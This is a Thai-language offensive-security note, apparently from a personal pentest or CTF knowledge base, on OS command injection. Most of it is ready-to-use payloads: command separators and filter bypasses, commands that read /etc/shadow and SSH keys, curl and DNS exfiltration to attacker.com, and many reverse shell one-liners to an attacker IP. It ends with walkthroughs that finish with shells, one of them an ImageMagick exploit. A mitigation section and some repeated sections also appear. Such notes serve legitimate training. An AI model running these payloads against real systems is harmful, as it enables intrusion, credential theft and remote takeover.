#web 
# Command Injection

> [!TIP] การตรวจสอบ Command Injection อย่างรวดเร็ว
> ลอง payload พื้นฐาน: `; whoami`, `| whoami`, `` `whoami` ``, `$(whoami)` หรือใช้ time-based detection: `; sleep 5`

## ❓ What
Command Injection (หรือ OS Command Injection) เป็นช่องโหว่ที่ผู้โจมตีสามารถแทรกและรันคำสั่ง OS commands บน server ได้ ผ่านทาง input ที่ไม่ได้รับการตรวจสอบอย่างเหมาะสม ส่งผลให้สามารถควบคุม server, อ่านไฟล์สำคัญ, หรือสร้าง backdoor ได้

**Command Execution Flow:**
```
User Input → Application → System Shell → OS Command Execution
     |            |              |              |
  "test"      exec()        /bin/sh         ls -la test
     |            |              |              |
  "; whoami"  exec()        /bin/sh    ls -la test; whoami
```

**ผลกระทบ:**
- Remote Code Execution (RCE)
- เข้าถึงระบบไฟล์ทั้งหมด
- Privilege escalation
- สร้าง backdoor หรือ reverse shell
- Data exfiltration
- Lateral movement ใน network

**เทคนิคที่เกี่ยวข้อง:** [[🌐 Web application]], [[SQL Injection]], [[File Upload]], [[SSRF (Server-Side Request Forgery)]]

## 🔍 Landmark (Detection)

### การตรวจหาช่องโหว่ Command Injection

1. **Input Fields ที่เสี่ยง** - parameter ที่อาจถูกส่งไป system command
   ```
   Ping/Network tools: ping <ip_address>
   File operations: download <filename>
   System tools: whois <domain>
   Image/Video processing: convert <file>
   ```

2. **Command Separators** - ทดสอบ separators ต่างๆ
   ```bash
   # Semicolon - รันคำสั่งต่อเนื่อง
   test; whoami
   
   # Pipe - ส่ง output ของคำสั่งแรกไปคำสั่งถัดไป
   test | whoami
   
   # AND - รันคำสั่งถัดไปถ้าคำสั่งแรกสำเร็จ
   test && whoami
   
   # OR - รันคำสั่งถัดไปถ้าคำสั่งแรกล้มเหลว
   test || whoami
   
   # Command substitution
   test `whoami`
   test $(whoami)
   ```

3. **Time-Based Detection** - ใช้ sleep หรือ timeout command
   ```bash
   # Linux/Unix
   test; sleep 5
   test && sleep 5
   test | sleep 5
   
   # Windows
   test & timeout 5
   test && ping -n 5 127.0.0.1
   ```

4. **Out-of-Band Detection** - ส่ง request ไปยัง external server
   ```bash
   # DNS lookup
   test; nslookup attacker.com
   test; dig attacker.com
   
   # HTTP request
   test; curl http://attacker.com/test
   test; wget http://attacker.com/test
   ```

> [!WARNING] Common Vulnerable Functions
> **PHP:** `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()`, backticks
> **Python:** `os.system()`, `os.popen()`, `subprocess.call()`, `subprocess.Popen()`
> **Node.js:** `child_process.exec()`, `child_process.spawn()` (ไม่ปลอดภัยถ้าใช้ shell mode)
> **Java:** `Runtime.getRuntime().exec()`, `ProcessBuilder`

## 🟦 Types of Command Injection

### 1. Classic Command Injection (In-band)
เห็น output ของ command ที่แทรกเข้าไปบนหน้า response ทันที

### 2. Blind Command Injection (Out-of-Band)
ไม่เห็น output โดยตรง แต่สามารถยืนยันได้ด้วย time-based หรือ external callbacks

### 3. Semi-Blind Command Injection
เห็นบางส่วนของ output หรือ error messages แต่ไม่เห็น output เต็ม

### 4. Context-Based Command Injection
คำสั่งถูกแทรกในบริบทเฉพาะ เช่น ใน shell script, cron job, หรือ configuration file

## 🔨 Exploitation

### Basic Command Injection

**Linux/Unix Commands:**
```bash
# Semicolon separator - รันคำสั่งตามลำดับ
test; whoami
test; id
test; pwd

# Pipe - ส่ง output ไปคำสั่งถัดไป (มักไม่เห็น output ของคำสั่งแรก)
test | whoami
test | id

# AND operator - รันถ้าคำสั่งแรกสำเร็จ (exit code 0)
test && whoami
valid_command && id

# OR operator - รันถ้าคำสั่งแรกล้มเหลว (exit code ≠ 0)
invalid_cmd || whoami
test || id
```
**หมายเหตุ:** ใช้ && เมื่อต้องการให้คำสั่งแรกสำเร็จก่อน, ใช้ || เมื่อต้องการให้คำสั่งแรกล้มเหลว

**Command Substitution:**
```bash
# Backticks - รัน command และแทนที่ด้วย output
test `whoami`
test `id`
echo `cat /etc/passwd`

# $() syntax - modern shell substitution
test $(whoami)
test $(id)
echo $(cat /etc/passwd)
```
**หมายเหตุ:** Command substitution มักถูกใช้เมื่อ separator อื่นถูก filter

**Newline Separator:**
```bash
# ใช้ %0a (URL encoded newline)
test%0awhoami
test%0aid

# หรือใช้จริงๆ (ถ้า input field รองรับ multiline)
test
whoami
```

**Windows Commands:**
```cmd
REM Ampersand - รันคำสั่งตามลำดับ
test & whoami
test & ipconfig

REM Double ampersand - รันถ้าคำสั่งแรกสำเร็จ
test && whoami
test && dir

REM Pipe - เหมือน Unix
test | whoami
```

### File Reading

**Linux/Unix:**
```bash
# อ่าน /etc/passwd
test; cat /etc/passwd
test && cat /etc/passwd

# อ่านไฟล์ sensitive
test; cat /etc/shadow
test; cat ~/.ssh/id_rsa
test; cat /var/www/html/config.php

# ค้นหา flag files
test; find / -name "flag.txt" 2>/dev/null
test; grep -r "flag{" /var/www/ 2>/dev/null
```

**Windows:**
```cmd
REM อ่าน system files
test & type C:\Windows\win.ini
test & type C:\boot.ini

REM อ่าน user files
test & type C:\Users\Administrator\Desktop\flag.txt
test & dir C:\Users\ /s /b | findstr flag
```

### Blind Command Injection

**Time-Based Detection:**
```bash
# Linux - ใช้ sleep
test; sleep 10
test && sleep 10
test | sleep 10

# Windows - ใช้ timeout
test & timeout 10
test && ping -n 10 127.0.0.1
```
**หมายเหตุ:** ถ้า response ช้ากว่าปกติ แสดงว่ามี command injection

**Out-of-Band Exfiltration:**
```bash
# ใช้ curl ส่งข้อมูลออกไป
test; curl http://attacker.com/?data=$(cat /etc/passwd | base64)

# ใช้ wget
test; wget http://attacker.com/$(whoami)

# ใช้ DNS exfiltration
test; nslookup $(whoami).attacker.com
test; dig $(cat /etc/hostname).attacker.com
```

**HTTP Server สำหรับรับข้อมูล:**
```bash
# เปิด HTTP server เพื่อรับ requests
python3 -m http.server 8000

# หรือใช้ netcat
nc -lvnp 8000
```

### Reverse Shell

**Bash Reverse Shell:**
```bash
# Basic reverse shell
test; bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Alternative - ใช้ nc (netcat)
test; nc <attacker_ip> 4444 -e /bin/bash

# ถ้า nc ไม่มี -e flag
test; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f
```
**หมายเหตุ:** เปิด listener ด้วย `nc -lvnp 4444` ก่อนส่ง payload

**Python Reverse Shell:**
```bash
# Python one-liner
test; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python3
test; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**PHP Reverse Shell:**
```bash
# PHP one-liner
test; php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Perl Reverse Shell:**
```bash
# Perl one-liner
test; perl -e 'use Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

**Listener Setup:**
```bash
# เปิด netcat listener
nc -lvnp 4444

# หรือใช้ pwncat สำหรับ enhanced shell
pwncat-cs -l 4444
```

## 🚪 Bypass Techniques

### 1. Space Character Bypass

**Using ${IFS}:**
```bash
# Internal Field Separator - แทน space ได้
test;cat${IFS}/etc/passwd
test;ls${IFS}-la

# หรือใช้ $IFS$9 (null argument)
test;cat$IFS$9/etc/passwd
```

**Using Tab:**
```bash
# Tab character (%09)
test;cat%09/etc/passwd
test;ls%09-la

# หรือใช้จริง (copy-paste tab)
test;cat	/etc/passwd
```

**Using < and >:**
```bash
# Redirect characters
test;cat</etc/passwd
test;cat<>/etc/passwd
```

**Using Brace Expansion:**
```bash
# ไม่ต้องใช้ space
test;{cat,/etc/passwd}
test;{ls,-la}
```

### 2. Quote and Escape Bypass

**Single/Double Quotes:**
```bash
# แทรก quotes ใน command
test;c"a"t /etc/passwd
test;c'a't /etc/passwd
test;w"ho"am"i"

# ใช้ quotes เพื่อ bypass filters
test;ca''t /etc/passwd
```

**Backslash Escape:**
```bash
# ใช้ backslash
test;c\at /etc/passwd
test;w\ho\am\i
test;\l\s -\l\a
```

### 3. Wildcard and Variable Bypass

**Using Wildcards:**
```bash
# ใช้ * และ ? แทนตัวอักษร
test;/bin/c?t /etc/passwd
test;/bin/ca* /etc/passwd
test;/???/c?t /???/passwd

# ใช้ [] character class
test;/bin/[c]at /etc/passwd
```

**Using Environment Variables:**
```bash
# ใช้ $PATH หรือ environment variables
test;$0  # shell itself
test;${PATH:0:1}bin${PATH:0:1}cat /etc/passwd

# ใช้ $HOME, $USER
test;echo $HOME
test;echo $USER
```

### 4. Encoding Bypass

**Base64 Encoding:**
```bash
# Encode command แล้ว decode ตอนรัน
echo "cat /etc/passwd" | base64
# Y2F0IC9ldGMvcGFzc3dkCg==

test;echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d|bash
test;`echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d`
```

**Hex Encoding:**
```bash
# ใช้ printf กับ hex
test;$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# หรือใช้ echo -e
test;echo -e "\x63\x61\x74 /etc/passwd" | bash
```

**Octal Encoding:**
```bash
# ใช้ $' syntax
test;$'\143\141\164' /etc/passwd  # cat
test;$'\167\150\157\141\155\151'  # whoami
```

### 5. Filter Keyword Bypass

**Concatenation:**
```bash
# แยก keyword ออกเป็นส่วนๆ
test;c''at /etc/passwd
test;ca$1t /etc/passwd
test;c\a\t /etc/passwd

# ใช้ variable
test;a=c;b=at;$a$b /etc/passwd
```

**Alternative Commands:**
```bash
# ใช้คำสั่งอื่นที่ทำงานเหมือนกัน
# แทน cat
test;tac /etc/passwd | tac
test;head /etc/passwd
test;tail /etc/passwd
test;less /etc/passwd
test;more /etc/passwd
test;nl /etc/passwd

# แทน ls
test;dir
test;echo *
```

## 🔥 Reverse Shell

### Bash Reverse Shell

**Basic Bash:**
```bash
# เชื่อมต่อกลับไปที่ attacker
test;bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# หรือใช้ -c flag
test;bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
```
**หมายเหตุ:** เปิด listener ด้วย `nc -lvnp 4444` ที่ attacker machine

**Python Reverse Shell:**
```bash
# Python one-liner
test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3
test;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat Reverse Shell:**
```bash
# Netcat traditional
test;nc <attacker_ip> 4444 -e /bin/bash

# Netcat without -e flag
test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 4444 >/tmp/f

# Netcat OpenBSD (nc.openbsd)
test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker_ip> 4444 >/tmp/f
```

**PHP Reverse Shell:**
```bash
# PHP one-liner
test;php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Perl Reverse Shell:**
```bash
# Perl one-liner
test;perl -e 'use Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Ruby Reverse Shell:**
```bash
# Ruby one-liner
test;ruby -rsocket -e'f=TCPSocket.open("<attacker_ip>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

> [!TIP] Reverse Shell Setup
> 1. เปิด listener: `nc -lvnp 4444`
> 2. ส่ง payload ผ่าน command injection
> 3. รอ connection จาก target
> 4. ได้ shell แล้ว upgrade: `python -c 'import pty;pty.spawn("/bin/bash")'`

## 🛡️ Modern Mitigations

### Application Level

**1. Input Validation (Whitelist):**
```python
# Python example - validate input
import re

def is_safe_input(user_input):
    # อนุญาตเฉพาะ alphanumeric และ dot
    if not re.match(r'^[a-zA-Z0-9.]+$', user_input):
        return False
    return True

# การใช้งาน
if is_safe_input(user_ip):
    # ปลอดภัย แต่ยังไม่ดีพอ
    os.system(f"ping -c 4 {user_ip}")
else:
    raise ValueError("Invalid input")
```

**2. ใช้ Safe APIs (Recommended):**
```python
# Python - ใช้ subprocess กับ array arguments (shell=False)
import subprocess

# UNSAFE - ใช้ shell=True
subprocess.call(f"ping -c 4 {user_ip}", shell=True)  # ❌ Vulnerable

# SAFE - ใช้ array arguments
subprocess.call(["ping", "-c", "4", user_ip], shell=False)  # ✅ Safe
```

**PHP Safe Execution:**
```php
<?php
// UNSAFE - ใช้ system() กับ string
system("ping -c 4 " . $user_ip);  // ❌ Vulnerable

// SAFE - ใช้ escapeshellarg()
$safe_ip = escapeshellarg($user_ip);
system("ping -c 4 " . $safe_ip);  // ✅ Better

// SAFER - ใช้ exec() กับ array และ validate
if (filter_var($user_ip, FILTER_VALIDATE_IP)) {
    exec("ping -c 4 " . escapeshellarg($user_ip), $output);
    echo implode("\n", $output);
}
?>
```

**Node.js Safe Execution:**
```javascript
// UNSAFE - ใช้ exec()
const { exec } = require('child_process');
exec(`ping -c 4 ${userIp}`);  // ❌ Vulnerable

// SAFE - ใช้ execFile() หรือ spawn()
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userIp], (error, stdout) => {
    console.log(stdout);  // ✅ Safe
});
```

**3. Least Privilege:**
```bash
# รัน application ด้วย user ที่มี permissions จำกัด
# สร้าง dedicated user
sudo useradd -m -s /bin/bash webuser
sudo -u webuser ./application

# ใช้ Docker/Container
docker run --user 1000:1000 --read-only app:latest
```

**4. Disable Dangerous Functions:**
```php
<?php
// php.ini - ปิด dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
?>
```

> [!WARNING] Common Mistakes
> - อย่าใช้ `shell=True` หรือ execute commands ผ่าน shell
> - อย่าใช้แค่ blacklist filtering (เช่น block `;` แต่ลืม `|`, `&&`)
> - อย่าลืม validate แม้จะใช้ safe APIs
> - อย่ารัน application ด้วย root หรือ privileged user

## 🛠️ Tool

### Commix (Command Injection Exploiter)
```bash
# Installation
git clone https://github.com/commixproject/commix.git
cd commix
python commix.py

# Basic usage
python commix.py --url="http://<target_url>/page?param=test"

# POST request
python commix.py --url="http://<target_url>/page" --data="param=test"

# ระบุ technique
python commix.py --url="http://<target_url>?param=test" --technique=ce
```

### Manual Testing Tools
```bash
# Burp Suite Intruder - automated payload testing
# [[Burp Suite]] Professional/Community

# curl สำหรับทดสอบ manual
curl "http://<target_url>/ping?ip=127.0.0.1;whoami"

# Netcat listener สำหรับ reverse shell
nc -lvnp 4444
```

### Payload Lists
```bash
# SecLists - command injection payloads
git clone https://github.com/danielmiessler/SecLists.git
cat SecLists/Fuzzing/command-injection-commix.txt
```

## 💡 Related

เทคนิคที่เกี่ยวข้อง:
- [[SQL Injection]] - แนวคิดการ injection คล้ายกัน
- [[XXE (XML External Entity)]] - อาจนำไปสู่ command execution
- [[SSRF (Server-Side Request Forgery)]] - มักพบร่วมกับ command injection
- [[File Upload]] - upload shell แล้วใช้ command injection trigger
- [[🌐 Web application]] - ความรู้พื้นฐาน web security

Tools:
- [[Burp Suite]] - manual testing และ automation
- **Commix** - automated command injection tool
- **Netcat** - reverse shell listener
- **SecLists** - payload wordlists

## 📚 Example

### CTF Walkthrough: HackTheBox - "Networked"

**ภาพรวม Challenge:**
- Web application มี ping utility
- Input field รับ IP address
- เป้าหมาย: RCE และหา flag

**Step 1: Reconnaissance**
```bash
# เข้าถึง ping tool
http://<target_ip>/ping.php

# ทดสอบ normal input
IP: 127.0.0.1
Result: PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data...
```

**Step 2: Test Command Injection**
```bash
# ทดสอบ semicolon separator
IP: 127.0.0.1; whoami
Result: www-data

# ยืนยัน RCE
IP: 127.0.0.1; id
Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Step 3: Enumerate System**
```bash
# ดู current directory
IP: 127.0.0.1; pwd
Result: /var/www/html

# List files
IP: 127.0.0.1; ls -la
Result: ping.php, index.html, uploads/

# หา flag
IP: 127.0.0.1; find / -name "flag.txt" 2>/dev/null
Result: /root/flag.txt
```

## 📚 Example

### CTF Walkthrough: HackTheBox - "Networked"

**ภาพรวม Challenge:**
- Web application มี ping utility
- Parameter IP address มี command injection
- เป้าหมาย: ได้ reverse shell และหา flag

**Step 1: Reconnaissance**
```bash
# เข้าเว็บและทดสอบ ping function
http://<target_ip>/ping.php?ip=8.8.8.8
# Response: PING 8.8.8.8 ... 64 bytes ...
```

**Step 2: Test Basic Command Injection**
```bash
# ทดสอบ semicolon separator
curl "http://<target_ip>/ping.php?ip=8.8.8.8;whoami"
# Response: PING 8.8.8.8 ... www-data

# Confirmed! มี command injection
```

**Step 3: Test Filters**
```bash
# ลอง space
curl "http://<target_ip>/ping.php?ip=8.8.8.8;ls -la"
# Response: Error - space not allowed

# ใช้ ${IFS} แทน space
curl "http://<target_ip>/ping.php?ip=8.8.8.8;ls\${IFS}-la"
# Response: total 24 ... index.php ping.php ...
```

**Step 4: Find Flag**
```bash
# ค้นหาไฟล์ flag
curl "http://<target_ip>/ping.php?ip=8.8.8.8;find\${IFS}/\${IFS}-name\${IFS}flag.txt\${IFS}2>/dev/null"
# Response: /home/user/flag.txt

# อ่าน flag
curl "http://<target_ip>/ping.php?ip=8.8.8.8;cat\${IFS}/home/user/flag.txt"
# Response: HTB{c0mm4nd_1nj3ct10n_1s_d4ng3r0us}
```

**Step 5: Get Reverse Shell**
```bash
# เปิด listener
nc -lvnp 4444

# ส่ง reverse shell payload
curl "http://<target_ip>/ping.php?ip=8.8.8.8;bash\${IFS}-c\${IFS}'bash\${IFS}-i\${IFS}>&\${IFS}/dev/tcp/<attacker_ip>/4444\${IFS}0>&1'"

# Connection received!
# Upgrade shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

> [!TIP] Key Takeaways
> - ใช้ ${IFS} แทน space เมื่อ space ถูก filter
> - ลองหลาย separators: `;`, `|`, `&&`, `||`
> - ใช้ time-based detection เมื่อไม่เห็น output
> - Reverse shell สะดวกกว่า exfiltrate data ทีละคำสั่ง

### Real-World Example: ImageMagick Command Injection

**Scenario:** Web application ใช้ ImageMagick เพื่อ resize images

**Step 1: Detect Vulnerability**
```bash
# Upload ไฟล์ image ปกติ
curl -F "image=@test.jpg" http://<target_url>/upload

# Response: Image resized successfully
```

**Step 2: Test Command Injection via Filename**
```bash
# สร้างไฟล์ที่มี payload ใน filename
touch "test;whoami;.jpg"

# Upload
curl -F "image=@test;whoami;.jpg" http://<target_url>/upload

# ตรวจสอบ response หรือ server logs
# อาจเห็น output ของ whoami
```

**Step 3: Exploit via ImageMagick Delegate**
```bash
# สร้าง malicious image file
echo 'push graphic-context
viewbox 0 0 640 480
fill "url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context' > exploit.mvg

# Upload exploit.mvg
curl -F "image=@exploit.mvg" http://<target_url>/upload
```

**Step 4: Get Reverse Shell**
```bash
# Prepare reverse shell script
echo '#!/bin/bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' > shell.sh

# Host script
python3 -m http.server 8000

# Upload malicious MVG
echo 'push graphic-context
viewbox 0 0 640 480
fill "url(https://example.com/image.jpg"|wget <attacker_ip>:8000/shell.sh -O /tmp/s.sh)"
fill "url(https://example.com/image.jpg"|bash /tmp/s.sh)"
pop graphic-context' > exploit.mvg

curl -F "image=@exploit.mvg" http://<target_url>/upload

# เปิด listener
nc -lvnp 4444
# Got shell!
```

> [!WARNING] Third-Party Libraries
> - ImageMagick, FFmpeg, Ghostscript มักมี command injection vulnerabilities
> - อัพเดท libraries เป็นประจำ
> - ใช้ sandboxing หรือ containerization
> - Validate ทั้ง filename และ file content

---

**สรุป Key Concepts:**
1. **Detection** - ใช้ separators (`;`, `|`, `&&`), time-based, OOB
2. **Bypass** - ${IFS}, encoding, quotes, wildcards, alternative commands
3. **Exploitation** - File reading, reverse shells, data exfiltration
4. **Defense** - Safe APIs (subprocess list args), input validation, least privilege
5. **Real Impact** - Full server compromise, lateral movement, data breach
